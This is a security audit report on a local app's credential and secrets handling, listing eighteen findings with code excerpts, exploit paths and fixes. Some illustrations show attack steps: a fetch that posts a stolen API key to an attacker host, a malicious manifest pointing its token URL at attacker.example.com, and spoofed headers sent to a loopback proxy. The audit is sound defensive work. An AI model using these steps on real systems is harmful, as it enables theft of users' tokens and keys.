# Audit 03 — Credentials & Secrets

Branch: `audit` · Target: NatStack credential subsystem (wave 6–8 recent build)
Auditor: read-only static review (no runtime exercise).

---

## Executive Summary

NatStack now mediates OAuth / API credentials for Gmail, Calendar, GitHub,
Linear, OpenAI, Anthropic, etc. It is (correctly) single-user and local-first,
so many of the "per-tenant" concerns that apply to multi-tenant SaaS do not.
However, the implementation has a collection of concrete weaknesses that
materially widen the blast radius of a compromise of any process on the user's
machine — or of any panel / worker the user installs.

The highest-severity issues are:

| # | Severity | Issue |
|---|----------|-------|
| F-01 | **Critical** | `CredentialStore` writes OAuth access + refresh tokens as **plaintext JSON** under `~/.natstack/credentials/` — no OS keychain, no encryption-at-rest. |
| F-02 | **Critical** | `authTokens.getProviderToken` allows **`panel` callers** to fetch raw OAuth / API keys for any configured AI provider (Anthropic, OpenAI, Google, …). Any panel the user opens can exfiltrate the user's API keys. |
| F-03 | **Critical** | Egress proxy trusts `x-natstack-worker-id` / `x-natstack-proxy-auth` headers unconditionally — `PROXY_AUTH_TOKEN` is minted per worker but **never validated** on the proxy. Any process on `127.0.0.1` can attribute itself as any worker and have the proxy stamp `Authorization: Bearer <user-token>` onto requests to Gmail / GitHub / etc. |
| F-04 | **High**    | `.secrets.yml` saved with default mode (usually `0o644`) via `saveSecretsToPath` — world-readable on most Linux/macOS systems. |
| F-05 | **High**    | Egress proxy does not enforce `expiresAt` on credentials — expired access tokens are forwarded verbatim (depends on the refresh scheduler running and never missing deadlines). |
| F-06 | **High**    | Third-party provider manifests (`@someone/natstack-provider-foo`) are trusted unconditionally — no signing, no allow-list — and control `apiBase` (→ which hosts get `Authorization: Bearer <user-token>` stamped) and `tokenUrl` (→ where the refresh-token is POSTed). |
| F-07 | **High**    | Webhook relay (Cloudflare Worker) has **no HMAC / auth / verification** at all — receiving endpoint for provider webhooks is an open drop box. |
| F-08 | **Medium**  | Full request URLs (with query strings) persisted to audit log (`~/.natstack/logs/credentials-audit-YYYY-MM-DD.jsonl`). Some provider APIs put auth codes / tokens / sensitive IDs in query strings. Log file created with default mode (not `0o600`). |
| F-09 | **Medium**  | Panel bootstrap RPC token is persisted in `sessionStorage` (`__natstackPanelInit`) and exposed as `globalThis.__natstackRpcToken` — any script in the panel's origin (incl. supply-chain-poisoned npm deps bundled into the panel) can read it. |
| F-10 | **Medium**  | `remoteCredentialStore` falls back to **plaintext token on disk** when Electron `safeStorage` is unavailable (only emits a `log.warn`). Behaviour is silent from the user's perspective. |
| F-11 | **Medium**  | `fetchPeerFingerprint` / `healthProbe` TOFU: first-time connect accepts the server-presented cert fingerprint under an "observedFingerprint" UX; but there is no pinning / UI friction enforced inside the daemon layer — relies entirely on the user visually comparing a 64-char hash. |
| F-12 | **Medium**  | Mobile `PanelWebView` copies `panelInit` (which contains `rpcToken`, `gitToken`) into `sessionStorage` inside the WebView. WebView sessionStorage isolation is per-origin; any JS the panel loads from a third-party script tag can read it. |
| F-13 | **Medium**  | OAuth `state` / `nonce` parameters for `completeConsent` are unauthenticated — any caller (including panel, worker) on the local RPC can drive `credentials.completeConsent` if they learn the nonce. Mitigated because nonces live in-memory and are single-use, but there is no caller-binding. |
| F-14 | **Low**     | PKCE `codeVerifier` is stored in `pendingConsents` Map indefinitely with no expiry sweep; grows unbounded on abandoned flows. |
| F-15 | **Low**     | Panel HTML responses disable caching (`Cache-Control: no-store`) but `/__loader.js` is cached `public, max-age=3600` — since that script contains no secrets (the init fetch is dynamic) this is fine, but worth re-asserting during review. |
| F-16 | **Low**     | Error messages returned from `completeConsent` include the upstream provider's raw error body (which can echo the authorization code back). |
| F-17 | **Low**     | `CredentialStore.save` uses `Math.random()` (non-crypto) as part of the temp-file name. Filenames are not secrets so this is only a minor quality issue, but OS-level atomic rename is what's being depended on — fine on Unix, fragile on Windows crash-between-rename. |
| F-18 | **Informational** | Admin token is 32 bytes hex (good), persisted at `0o600` in a `0o700` dir (good). Good baseline. |

Nothing in the audit surfaced hard-coded real-looking credentials (only
`PLACEHOLDER_*` client IDs and `xoxb-test-bot-token` fixtures). Git-history
sweep for `AKIA…`, `sk_live_…`, `BEGIN PRIVATE KEY`, `ghp_…` came back clean.

---

## Detailed Findings

### F-01 — Plaintext on-disk storage of OAuth access / refresh tokens  [**Critical**]

**File / Line:** `packages/shared/src/credentials/store.ts:17-61` (+ `types.ts:48-57`).

**Snippet:**
```ts
// packages/shared/src/credentials/store.ts:17-23
function getDefaultBasePath(): string {
  const homeDir = process.env["HOME"] ?? process.env["USERPROFILE"];
  if (!homeDir) {
    throw new Error("Unable to resolve a home directory for credential storage");
  }
  return path.join(homeDir, ".natstack", "credentials");
}

// :32-52 — save path
async save(credential: Credential): Promise<void> {
  ...
  const fileContents = `${JSON.stringify(credential, null, 2)}\n`;
  await fs.mkdir(providerDir, { recursive: true });
  handle = await fs.open(tempPath, "w", 0o600);
  await handle.writeFile(fileContents, "utf8");
  ...
  await fs.rename(tempPath, targetPath);
  await fs.chmod(targetPath, 0o600);
}
```

`Credential` (types.ts:48) contains `accessToken: string` and
`refreshToken?: string`. These are serialised with `JSON.stringify` and
written to disk verbatim. There is **no encryption-at-rest**, **no keychain
integration**, no envelope-encryption KEK. The `0o600` mode + the containing
directory's mode is the *only* protection.

Compare to `src/main/remoteCredentialStore.ts` which correctly uses Electron
`safeStorage` (OS keychain / DPAPI / libsecret) for the remote-server token.
The remote-admin-token path is the one that got the keychain treatment; the
third-party OAuth tokens — which are arguably *more* dangerous because they
unlock user data on external SaaS — did not.

**Exploitability.**

1. Any other process running as the user can read
   `~/.natstack/credentials/**/*.json` (on Linux/Mac) — no privileges needed.
2. Backup tools (Time Machine, restic, Dropbox, Arq, cloud sync) with default
   include-rules will silently copy the tokens off the machine.
3. Directory is under `$HOME/.natstack`, not `~/.config/natstack` — some
   dotfile-syncing setups (`stow`, `chezmoi`, `~/.config` selectivity)
   inadvertently catch it.
4. Core dumps / process memory snapshots include the plaintext tokens after
   load.
5. A `.natstack/` glob shared with a coworker (e.g. via a shared home
   directory on a dev box) leaks every connected integration.

**Remediation.**

- Wrap `CredentialStore.save` / `load` in Electron `safeStorage` when running
  inside the Electron main process (same pattern as
  `remoteCredentialStore.ts`). Persist ciphertext-as-base64 in the JSON.
- In server-standalone mode (no Electron available), use a KEK derived from
  OS keychain (`keytar`) or fall back to an XDG-path AES-GCM file whose KEK
  lives in `~/.config/natstack/.creds-kek` (0o600) so at least it is in a
  distinct file from the ciphertext.
- Document in `credential-system.md` that non-Electron deployments without
  keychain support must opt in to a less-secure fallback; warn on startup.
- Move the default base path under the OS-appropriate state directory
  (macOS: `~/Library/Application Support/natstack/credentials`, Linux:
  `$XDG_STATE_HOME/natstack/credentials`) alongside other state — the existing
  `getCentralConfigDirectory()` helper already knows how.

---

### F-02 — `authTokens.getProviderToken` callable from `panel` callers  [**Critical**]

**File / Line:** `src/server/services/authService.ts:275`, `286-287`.

**Snippet:**
```ts
// :272-281
policy: { allowed: ["shell", "panel", "worker", "server"] },
methods: {
  getProviderToken: { args: z.tuple([z.string()]) },
  persist:          { args: z.tuple([z.string(), persistInputSchema]) },
  logout:           { args: z.tuple([z.string()]) },
  listProviders:    { args: z.tuple([]) },
  waitForProvider:  { args: z.tuple([z.string(), z.number().optional()]) },
},
```

`getProviderToken(providerId)` returns a raw, usable access token (OAuth
access token for `openai-codex`, or the literal `ANTHROPIC_API_KEY` /
`OPENAI_API_KEY` / `GOOGLE_API_KEY` env var content for env-backed providers
— see `:144-168`). It is explicitly listed as callable by `panel`.

**Exploitability.** Any panel the user loads — including
user-installed third-party panel packages pulled via npm, or any panel
rendered inside a ConsentDialog — can RPC `authTokens.getProviderToken`
through the regular dispatch:

```js
await natstackRpc.call("authTokens.getProviderToken", ["anthropic"]);
// → "sk-ant-api03-…"
```

That key then exfiltrates to any origin via `fetch(attacker, {method:"POST", body: key})`.
A single malicious / compromised panel vendor collects every API key of
every NatStack user who installs the panel.

The comment in the source (`:272-274`) says "Workers fetch tokens for outbound
API calls; panels list provider status" — that intent is correct, but the
policy as coded grants panels the same privileges as workers. The entire
*reason* for the egress-proxy design is to keep bearer tokens out of the
sandbox; exposing them directly over `authTokens` RPC undoes it.

**Remediation.**

- Split the service in two: `authTokens.getProviderToken` restricted to
  `{ allowed: ["worker", "server"] }`; a new `authTokens.getProviderStatus`
  (metadata only — no secrets) for panels.
- Or, for panels that *need* to know whether a provider is connected without
  knowing the token, expose a `listProviders` surface (already exists —
  `:239-260`) and drop `getProviderToken` from the panel-visible method set
  via per-method policy if the framework supports it.
- Audit `serviceDispatcher` to confirm that `policy.allowed` is enforced at
  the method level before dispatch. A defence-in-depth pass here is worth it.

---

### F-03 — Egress proxy accepts spoofed attribution headers  [**Critical**]

**Files / Lines:**
- `src/server/services/egressProxy.ts:21-22, 338-351` — header parsing.
- `src/server/workerdManager.ts:350-353, 423-426` — `PROXY_AUTH_TOKEN`
  minted and injected into worker bindings.
- Nothing in the repo consumes / validates `PROXY_AUTH_TOKEN` against what
  the proxy received.

**Snippet — egress proxy (server side):**
```ts
// src/server/services/egressProxy.ts:21-22
const WORKER_ID_HEADER = "x-natstack-worker-id";
const PROXY_AUTH_HEADER = "x-natstack-proxy-auth";

// :338-351 — the only call site that reads those headers
private attributeRequest(req: IncomingMessage): RequestAttribution | null {
  const workerId = this.readHeader(req, WORKER_ID_HEADER);
  const callerId = this.readHeader(req, PROXY_AUTH_HEADER);
  if (!workerId || !callerId) return null;
  return { workerId, callerId, rateLimitKey: `${workerId}:${callerId}` };
}
```

The proxy reads both headers and trusts them as-is. `PROXY_AUTH_HEADER` is
*not* a secret — it is used as `callerId`, which is just a string label for
audit and rate-limit keying.

**Snippet — workerd side:**
```ts
// src/server/workerdManager.ts:348-358 (DO path), :423-430 (regular worker)
const doProxyAuthToken = crypto.randomBytes(24).toString("base64url");
const bindings: object[] = [
  { name: "RPC_AUTH_TOKEN", text: serviceToken },
  { name: "PROXY_AUTH_TOKEN", text: doProxyAuthToken },
  ...
];
```

The code mints a 24-byte random token and hands it to the worker as
`PROXY_AUTH_TOKEN`. The intent is unambiguous — it should be presented as a
shared secret when the worker's outbound fetch hits the local proxy — but
`egressProxy.ts` never checks it. The `PROXY_AUTH_HEADER` is used purely as
an identifier, not a secret.

**Exploitability.**

The proxy binds to `127.0.0.1:<ephemeral>` and accepts any TCP connect.
Given any process with network-to-loopback access (any user process on the
machine; any compromised worker; any Electron renderer; any panel that can
reach that IP), the attacker can:

1. Scan ports to find the proxy (ephemeral, but enumerable).
2. Send:
   ```
   GET https://api.github.com/user HTTP/1.1
   X-Natstack-Worker-ID: my-chosen-worker-id
   X-Natstack-Proxy-Auth: my-chosen-caller-id
   ```
3. The proxy routes the request to the matching provider manifest
   (`github`), calls `consentStore.list(workerId)` — if the attacker picked
   a `workerId` that has a real consent grant — and stamps
   `Authorization: Bearer <user_GitHub_token>` onto the request to
   `api.github.com`.

Worker IDs are deterministic/enumerable (panel IDs, service keys of
`do-service:…`). An attacker can guess or list them. Even if they can't, they
can simply wait, observe an audit entry, and replay.

The *same* loopback `127.0.0.1` proxy design is exactly what NanoClaw /
OpenClaw use, but those projects gate the proxy with a per-instance shared
secret header. NatStack mints that secret and then forgets to check it.

**Remediation.**

- Validate `PROXY_AUTH_HEADER` against a set of currently-registered
  `PROXY_AUTH_TOKEN` values held by the server. Key the set by `workerId`;
  a lookup of (`workerId`, presented token) must succeed before any further
  processing.
- Rotate the token when a worker restarts (already happens — it is minted on
  every service boot — so just thread it into the proxy's allow-map).
- Bind the proxy socket to a UNIX domain socket with 0o600 on POSIX where
  available, removing the loopback attack surface entirely.
- Audit `consentStore.list(workerId)` — since `workerId` is currently
  attacker-supplied, a malicious caller can enumerate consent grants by
  brute-forcing worker IDs.

---

### F-04 — `.secrets.yml` written with default (world-readable) file mode  [**High**]

**File / Line:** `packages/shared/src/workspace/loader.ts:204-212`.

**Snippet:**
```ts
export function saveSecretsToPath(secretsPath: string, secrets: Record<string, string>): void {
  try {
    fs.mkdirSync(path.dirname(secretsPath), { recursive: true });
    fs.writeFileSync(secretsPath, YAML.stringify(secrets), "utf-8");
  } catch (error) {
    console.error("[Config] Failed to save secrets:", error);
    throw error;
  }
}
```

No `mode` argument to `fs.writeFileSync`. Default Node behaviour is `0o666 &
~umask`; on a typical system with `umask 022` the file ends up `0o644` —
world-readable.

Compare with `centralAuth.savePersistedAdminToken` which *does* use
`{ mode: 0o600 }` and wraps the directory in `ensureCentralConfigDir()` (sets
`0o700`). That pattern should be applied everywhere under
`~/.config/natstack`.

**Exploitability.** On a shared Unix system (dev boxes, build servers,
containers with multiple UIDs), `cat ~targetuser/.config/natstack/.secrets.yml`
returns every API key the target has pasted in: Anthropic, OpenAI, Google,
Groq, etc.

**Remediation.**

```ts
fs.writeFileSync(secretsPath, YAML.stringify(secrets), { encoding: "utf-8", mode: 0o600 });
```
and prepend an `ensureCentralConfigDir()` call so the dir is `0o700`. On
update, `fs.chmodSync(secretsPath, 0o600)` defensively.

---

### F-05 — Egress proxy never checks token expiry  [**High**]

**File / Line:** `src/server/services/egressProxy.ts:393-438`.

```ts
// :393-405
const credential = await Promise.resolve(
  this.deps.credentialStore.getCredential(grant.connectionId),
);
if (!credential) {
  return { error: { statusCode: 502, ... } };
}
return { grant, credential };

// :437-438
if (credential) {
  headers.authorization = `Bearer ${credential.accessToken}`;
}
```

No `Date.now() >= credential.expiresAt` check, no on-demand refresh if
expired. Refresh is driven entirely by `RefreshScheduler` timers
(`packages/shared/src/credentials/refresh.ts`), which fire at `expiresAt -
bufferSeconds`. If the scheduler:

- was never started,
- was restarted between scheduling and firing,
- skipped because the process was suspended (`SIGSTOP`, laptop lid closed,
  VM paused),
- failed an upstream refresh and didn't retry,

— then `accessToken` in the store is stale, and the proxy forwards the stale
bearer verbatim. The upstream 401 propagates back to the worker (fine), but
it means:

- There is no "tokens in the store are as fresh as possible when used"
  invariant.
- Revoked tokens may continue to be attempted until the next scheduled
  refresh window.
- If the refresh endpoint is down (e.g. GitHub incident) but the cached
  `accessToken` has already expired, every request from the worker leaks
  the expired bearer for no benefit.

**Remediation.**

- In `authorizeRequest`, after loading the credential, call
  `refreshScheduler.refreshNow(providerId, connectionId)` (single-flight,
  already implemented) when `credential.expiresAt && Date.now() >= credential.expiresAt - buffer`.
- Fail-closed on refresh failure (return 503, do not forward a known-stale
  bearer).

---

### F-06 — Third-party provider manifests are unsigned and unscoped  [**High**]

**Files:**
- `docs/writing-a-provider-manifest.md` (entire doc — no mention of signing
  or trust).
- `packages/shared/src/credentials/registry.ts` — `register()` is a plain
  `Map.set`.

`docs/credential-system.md:117-120`:
> **Third-party providers as npm packages.** Anyone can publish
> `@someone/natstack-provider-foo` with their own `client_id` and a
> manifest; users install it and it registers on startup.

**Exploitability.** A malicious provider manifest can declare:

```ts
export const evil: ProviderManifest = {
  id: "evil",
  apiBase: ["https://api.github.com"],   // ← piggyback on existing consent
  flows: [{
    type: "loopback-pkce",
    clientId: "...",
    tokenUrl: "https://attacker.example.com/oauth/token",
  }],
  ...
};
```

Impacts:

1. `apiBase` controls which hosts the egress proxy will treat as belonging
   to this provider. If `evil.apiBase` collides with `github.com`, depending
   on registry ordering (`listProviderManifests()` returns them in iteration
   order), the proxy may route matching requests through the attacker's
   manifest. The `buildForwardHeaders` call then stamps
   `Authorization: Bearer <some-user-token>` on requests that attacker
   controls.
2. `tokenUrl` is where the PKCE `code` and (for refresh) `refresh_token` are
   POSTed. A malicious `tokenUrl` receives the user's refresh token.
3. `whoami.url` is not fetched by the proxy but may be used in UI. Lower
   concern.

There is no:
- manifest signature,
- publisher identity check,
- conflict detection with built-in manifests,
- scope capability declaration in the manifest schema (integrations that
  load manifests are entirely trusted).

**Remediation.**

- Reject third-party registrations whose `apiBase` intersects a built-in
  manifest's `apiBase`.
- Require operators to explicitly allow-list third-party provider IDs in
  central config (`~/.config/natstack/config.yml` → `providers: [ ... ]`),
  default deny.
- Consider a minimal manifest-signing scheme: publisher's public key in a
  known location; manifest JSON + signature at install time.
- Document in `docs/writing-a-provider-manifest.md` that provider manifests
  are code-equivalent trust level.

---

### F-07 — Webhook relay has no authentication or signature verification  [**High**]

**File / Line:** `apps/webhook-relay/src/index.ts` (full file, 65 lines).

```ts
if (request.method === "POST" && segments.length === 3 && segments[0] === "webhook") {
  const [, instanceId, providerId] = segments;
  void env; void instanceId; void providerId;
  return json({ received: true });
}
```

- No HMAC verification of the provider's signature (Stripe's
  `Stripe-Signature`, GitHub's `X-Hub-Signature-256`, Slack's
  `X-Slack-Signature`).
- No shared-secret header or KV-backed subscription lookup.
- No binding of `instanceId` / `providerId` to a subscription.
- No body forwarded anywhere (the `ws` handler just sends `{type:"connected"}`).

Given `docs/credential-system.md` positions the relay as the delivery path
for push webhooks, the production-grade version of this worker must verify
signatures and forward bodies; shipping the stub into prod would allow any
public POST to fire webhook events at subscribers, which in turn can trigger
workers with attacker-controlled input — a remote-command-on-webhook vector.

**Remediation.**

- Treat the current worker as an unfinished skeleton: block deployment behind
  a README warning, or delete until the real implementation lands.
- For each provider, require the manifest to carry a verification algorithm
  (e.g. `webhooks.subscriptions[*].verify: "hmac-sha256:X-Hub-Signature-256"`)
  and implement a verify loop in the worker that looks up the shared secret
  from Cloudflare Secrets / KV before acknowledging.
- Rate-limit per `instanceId` to contain abuse.

---

### F-08 — Audit log persists full URLs and runs with default file mode  [**Medium**]

**Files:**
- `packages/shared/src/credentials/audit.ts:44-66` — `AuditLog.append`.
- `src/server/services/egressProxy.ts:254-270, 299` — every forwarded URL,
  including query string, is captured into `AuditEntry.url`.

```ts
// audit.ts:53-66
async append(entry: AuditEntry): Promise<void> {
  await mkdir(this.logDir, { recursive: true });
  const filePath = this.getLogPath(entry.ts);
  const serializedEntry = `${JSON.stringify(entry)}\n`;
  ...
  await appendFile(filePath, serializedEntry, "utf8");
}
```

- No `mode` on `appendFile` → `0o644` under default umask.
- No `mode` on `mkdir` → `0o777 & ~umask` → usually `0o755`.

**Exploitability.**

1. Other users on the machine can `tail -f ~/.natstack/logs/credentials-audit-*.jsonl`
   and watch the victim's API traffic in real time.
2. Some third-party APIs put sensitive material in the URL: Google Calendar's
   `events.list?access_token=…` (legacy); OpenAI's older image URLs; any API
   that uses `?api_key=…`. The proxy does not redact query strings.
3. Log rotation cap is a hard silent drop at 50 MB (`:61-63`) — `return;`
   instead of rotation means entries are lost without indication once the
   file reaches that size. Not a security issue per se, but relevant if audit
   logs are a compliance requirement.

**Remediation.**

- `appendFile(filePath, serializedEntry, { encoding: "utf8", mode: 0o600 })`
  and `chmodSync` after first create.
- `mkdir(this.logDir, { recursive: true, mode: 0o700 })`.
- Strip / hash the query string before persistence; retain only the path +
  (for hosts where query is important for audit) a hashed fingerprint.
- Rotate (or at least emit a log.warn) when file size cap is hit; stopping
  audit silently is worse than failing loud.

---

### F-09 — Panel `rpcToken` exposed via `sessionStorage` and `globalThis`  [**Medium**]

**File / Line:** `src/server/configLoader.ts:10-50`.

```js
sessionStorage.setItem("__natstackPanelInit", JSON.stringify(cfg));   // :26
...
globalThis.__natstackRpcToken = cfg.rpcToken;                         // :48
```

The panel RPC token is:
- Injected into the page global namespace. Any script on the page origin
  reads it via `globalThis.__natstackRpcToken`.
- Persisted to `sessionStorage`. Any script can `sessionStorage.getItem(...)`
  it.

Because panels are allowed to include arbitrary npm dependencies, a single
compromised dep (supply-chain) can exfiltrate the panel RPC token and call
any RPC method allowed for `panel`. That token, combined with F-02, yields
direct access to all AI provider credentials.

**Exploitability.** Classic supply-chain surface. `ua-parser-js`-style
incidents against a panel dep immediately become a credential-theft incident
against NatStack users.

**Remediation.**

- Keep the token in closure-scoped state inside a preload/isolated-world
  script; wrap RPC calls through a narrow `window.natstack.rpc.call(...)`
  that never exposes the token to the main-world globals.
- Stop mirroring to `sessionStorage` (or mirror only a nonce that's bound to
  a short-lived server-side authenticator).
- Scope panel tokens per call via capability-style one-time tokens if
  feasible.

---

### F-10 — Silent plaintext fallback for `remoteCredentialStore`  [**Medium**]

**File / Line:** `src/main/remoteCredentialStore.ts:82-103`.

```ts
const encrypted = safeStorage.isEncryptionAvailable();
const tokenField = encrypted
  ? safeStorage.encryptString(creds.token).toString("base64")
  : creds.token;
...
fs.writeFileSync(p, JSON.stringify(payload, null, 2), { mode: 0o600 });
if (!encrypted) {
  log.warn(`safeStorage unavailable — token written plaintext at ${p}`);
}
```

On platforms where `safeStorage` is not available (headless Linux with no
libsecret, certain container setups, Windows user profile without DPAPI
bootstrap), the remote admin token is written to disk as plaintext. The only
signal to the user is a `log.warn` buried in dev logs.

**Exploitability.** A misconfigured Linux install (fresh minimal image, no
keyring) silently downgrades to plaintext. The user sees no UI indication;
nothing in the Connection Settings dialog signals "your token is not
encrypted on this machine".

**Remediation.**

- Fail closed: refuse to persist if `safeStorage.isEncryptionAvailable()`
  returns false; surface a UI error with remediation instructions (install
  `libsecret`, unlock the keyring, etc.).
- Or, encrypt with a machine-KEK derived from a file readable only by the
  user (`~/.config/natstack/.kek`) as a better-than-plaintext fallback.
- Surface "encryption status" in the settings UI (`RemoteCredCurrent` → add
  `isEncrypted: boolean`).

---

### F-11 — TOFU fingerprint UX for remote-server TLS pinning  [**Medium**]

**Files:**
- `src/main/services/remoteCredService.ts:58-84, 241-277` — probe + prompt flow.
- `src/main/tlsPinning.ts:55-82` — pinning implementation.

The flow accepts an "observedFingerprint" on first use (`:272-277`) and asks
the user to confirm. This is standard TOFU, but with human-readable
caveats:

1. The fingerprint is a 64-character colon-separated hex — humans are bad at
   comparing those. No visual aid (emoji hash, word list, BIP39-style).
2. `tlsPinning.ts:58-82` — `rejectUnauthorized: false` on the TLS connect
   with a post-handshake callback in `secureConnect`. The callback does
   `sock.destroy(...)` on mismatch. This is correct *only if no application
   data is written before the secureConnect callback synchronously runs* — a
   race in theory; in practice `ws` awaits `secureConnect` before emitting
   `open`, so safe. Worth a code comment making the invariant explicit.
3. `checkServerIdentity: () => undefined` disables hostname checking. For a
   pinned fingerprint this is OK; if the pin is ever dropped / lost while the
   CA path stays, the channel degrades to "any cert signed by the trusted
   CA, for any hostname" — not ideal.

**Remediation.**

- Render fingerprints as space-separated 4-hex-char groups to improve
  comparison.
- Disable the "allow no fingerprint" path once a CA path is present —
  hostname verification should be re-enabled in the CA-trust code path
  (don't pass `checkServerIdentity: () => undefined` unless a fingerprint is
  the only trust root).

---

### F-12 — Mobile WebView panelInit mirrored into `sessionStorage`  [**Medium**]

**File / Line:** `apps/mobile/src/components/PanelWebView.tsx:102-107`.

```js
globalThis.__natstackPanelInit = panelInit;
if (panelInit !== null) {
  sessionStorage.setItem("__natstackPanelInit", JSON.stringify(panelInit));
}
```

Same class of issue as F-09 for the mobile surface. Mobile additionally has
the concern that `rpcToken` (the shell token or a panel-specific token) sits
in WebView `sessionStorage`; if the panel loads any <script src="..."> that
is then network-tampered (mobile networks, captive portals, misconfigured
plaintext in-app URLs), it reads the token. iOS/Android keychain storage in
`auth.ts` is correct for the shell token; the exposure is the subsequent
panel-token handoff into WebView land.

**Remediation.**

- Avoid persisting panelInit to `sessionStorage` on mobile — the RN host
  already has the data and can serve it on every panel refresh via
  `getPanelInit`. The `sessionStorage` copy exists only as a "static refresh"
  path; remove it.

---

### F-13 — `completeConsent` accepts unauthenticated nonce  [**Medium**]

**File / Line:** `src/server/services/credentialService.ts:194-255, 340-397`.

```ts
async function completeConsent(params: CompleteConsentParams): Promise<ConsentResult> {
  const pending = pendingConsents.get(params.nonce);
  if (!pending) throw new Error("Unknown or expired consent nonce");
  pendingConsents.delete(params.nonce);
  ...
}
```

Policy: `{ allowed: ["shell", "panel", "server", "worker"] }` (`:340`).

Any caller kind can drive `completeConsent` as long as they present a valid
`nonce`. The nonce is generated inside `beginConsent` on the same server
process; the mapping `(nonce → {providerId, codeVerifier, redirectUri})` is
in-memory. Since the nonce is 16 random bytes and single-use, a direct
brute-force is infeasible. However:

- The nonce travels through the redirect URL, into OS URL handlers / browser
  history / any OS-level accessibility audit log. Another local process
  (e.g. a panel that can read browser history, or a mobile app that
  intercepts `natstack://oauth/callback`) can pick it up.
- `completeConsent` then stores the resulting `Credential` — including the
  long-lived refresh token — under a connection ID the attacker controls
  (`randomUUID` server-side — attacker can't pick it, but they can learn it
  from the return value).
- The attacker-controlled completion means: a legit user starts a consent
  flow in one panel; an attacker-controlled panel races to call
  `completeConsent` with the intercepted `code` (they don't even need the
  nonce if they can observe the first redirect), and the resulting
  credential is registered — same storage — but attributed to a flow the
  legitimate user didn't finish themselves.

For a single-user local app this is mostly academic; with mobile universal
links and custom URL schemes (F-05's `natstack://`), hijacking the URL scheme
is a known Android/iOS attack class.

**Remediation.**

- Bind `nonce` to the caller that created it (record `ctx.callerId` /
  `ctx.callerKind` in `PendingConsent` and enforce it on complete).
- Expire nonces after 10 minutes (currently no expiry sweep — see F-14).
- For mobile, prefer universal links over custom URL schemes where possible
  (universal links are harder to hijack than `scheme://`).

---

### F-14 — `pendingConsents` Map has no TTL eviction  [**Low**]

**File / Line:** `src/server/services/credentialService.ts:130, 182-192`.

```ts
const pendingConsents = new Map<string, PendingConsent>();
...
pendingConsents.set(nonce, {
  nonce, providerId, scopes, codeVerifier, redirectUri,
  createdAt: Date.now(),
});
```

`createdAt` is recorded but never consumed. Abandoned flows accumulate. At
~40 bytes per nonce plus a 32-byte codeVerifier, this is a small DoS /
memory-leak footprint, but also F-13's window is infinite.

**Remediation.**

- Sweep entries older than 10 minutes on each `beginConsent`, or register
  a `setTimeout(() => pendingConsents.delete(nonce), TEN_MINUTES).unref()`
  at registration time.

---

### F-15 — `/__loader.js` cached publicly  [**Low**]

**File / Line:** `src/server/panelHttpServer.ts:361-362`.

```ts
if (pathname === "/__loader.js") {
  res.writeHead(200, {
    "Content-Type": "application/javascript; charset=utf-8",
    "Cache-Control": "public, max-age=3600",
  });
}
```

The loader script as shipped (see `configLoader.ts`) is identical for all
callers and contains no secret material. `Cache-Control: public` is
acceptable. However, the existence of `sessionStorage.setItem` inside
`__loader.js` combined with an intermediary HTTP cache could mean the
fingerprint of "which keys are written where" gets cached — trivial
information disclosure.

**Remediation.** None required beyond documenting the invariant.

---

### F-16 — Error body from token exchange echoed into thrown Error  [**Low**]

**File / Line:** `src/server/services/credentialService.ts:226-229`.

```ts
if (!tokenResponse.ok) {
  const errorBody = await tokenResponse.text();
  throw new Error(`Token exchange failed: ${tokenResponse.status} ${errorBody}`);
}
```

Some providers echo the submitted authorization `code` back in an
`error_description`. That `Error` message is then consumed by whatever
called `completeConsent` — in panel / renderer land, often rendered into
UI or logged. Low risk because the `code` is already single-use at that
point, but it's still leakage into places tokens shouldn't be.

**Remediation.** Include only `tokenResponse.status` and provider name in
the thrown Error; log the body internally (with redaction) for debugging.

---

### F-17 — Non-crypto RNG in credential temp-filename  [**Low**]

**File / Line:** `packages/shared/src/credentials/store.ts:35-38`.

```ts
const tempPath = path.join(
  providerDir,
  `.${credential.connectionId}.${process.pid}.${Date.now()}.${Math.random().toString(16).slice(2)}.tmp`,
);
```

`Math.random()` is not cryptographically secure — but nothing about this
filename needs to be unpredictable. This is a quality-of-implementation
note: use `crypto.randomBytes(6).toString("hex")` to match the rest of the
codebase's idioms.

---

### F-18 — Admin token baseline (informational, no action) — **Good**

`packages/shared/src/centralAuth.ts:70-73`:

```ts
export function savePersistedAdminToken(token: string): void {
  ensureCentralConfigDir();                   // 0o700 dir
  fs.writeFileSync(getAdminTokenPath(), token, { mode: 0o600 });
}
```

32-byte hex token (`tokensService.ts:82`), 0o600 in a 0o700 directory. This
is the standard to measure other secret-bearing files against.
`rotateAdmin` persists-then-swaps with correct error handling
(`tokensService.ts:81-95`). No issues.

---

## Remediation Plan (Prioritised)

### P0 — Ship before next release

1. **F-02 — Lock down `authTokens.getProviderToken`.** Remove `panel` from
   the policy allow-list. Land a follow-up PR exposing a read-only
   `authTokens.getProviderStatus` for panel UI needs.
2. **F-03 — Enforce `PROXY_AUTH_TOKEN` on the egress proxy.** Plumb the
   per-worker token from `workerdManager` into the proxy; validate in
   `attributeRequest`. Reject unknown/mismatched tokens with 407.
3. **F-01 — Encrypt OAuth credentials at rest.** Integrate Electron
   `safeStorage` for Electron-hosted deployments; design a fallback for
   standalone server mode (keytar or file-KEK).
4. **F-07 — Gate the webhook relay behind a feature flag / docs warning
   until the real verification logic lands.**

### P1 — Next sprint

5. **F-04** — add `mode: 0o600` to `saveSecretsToPath`.
6. **F-05** — check `expiresAt` + `refreshNow` in `authorizeRequest`.
7. **F-08** — tighten audit log modes; strip query strings; rotate instead
   of silently dropping.
8. **F-09 / F-12** — move panel RPC token out of `sessionStorage` /
   `globalThis`.
9. **F-13 / F-14** — bind consent nonce to caller; TTL-sweep
   `pendingConsents`.

### P2 — Design debt

10. **F-06** — third-party provider trust model (signing / allow-list /
    overlap detection).
11. **F-10** — fail-closed when `safeStorage` is unavailable; surface
    encryption status in the UI.
12. **F-11** — fingerprint UX improvements; audit `rejectUnauthorized:
    false` paths.

---

## Appendix A — Files reviewed

| Path | Purpose |
|------|---------|
| `src/server/services/credentialService.ts` | Consent / connection RPC surface |
| `src/server/services/tokensService.ts` | Panel + admin token management |
| `src/server/services/authService.ts` | AI-provider OAuth / API-key store |
| `src/server/services/authFlowService.ts` | (skimmed) |
| `src/server/services/egressProxy.ts` | Per-worker HTTP/HTTPS egress + `Authorization` stamping |
| `src/server/services/webhookService.ts` | Webhook subscription RPC |
| `src/server/services/oauthProviders/codexTokenProvider.ts` | ChatGPT refresh/getApiKey |
| `src/server/workerdManager.ts` | `PROXY_AUTH_TOKEN` minting |
| `src/server/configLoader.ts` | Panel bootstrap loader script |
